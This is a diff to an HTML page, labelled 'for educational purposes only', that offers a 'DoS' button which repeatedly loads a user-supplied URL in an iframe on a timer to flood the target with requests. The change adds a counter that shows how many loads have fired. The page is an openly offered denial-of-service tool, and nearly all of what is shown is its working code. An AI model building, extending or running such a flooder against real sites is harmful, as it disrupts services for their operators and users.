@@ -13,9 +13,11 @@
 		<p><b>FOR EDUCATIONAL PURPOSES ONLY!!</b></p>
 		<p>URL: <input type="text" id="myURL" value="https://example.org"></p>
 		<button onClick="getButtonContents();myTimer();interval();">DoS</button>
+		<div id="count"></div>
 		<div id="demo"></div>
 		<script>
 			var ui = "https://example.org";
+			var i = 0;
 			
 			function getButtonContents() {
 				ui = document.getElementById("myURL").value;
@@ -23,6 +25,8 @@
 			
 			function myTimer() {
 				document.getElementById("demo").innerHTML = '<iframe src="'+ui+'" style="border:none;"></iframe>';
+				i++;
+				document.getElementById("count").innerHTML = '<p>'+i+'</p>';
 			}
 			
 			function interval() {
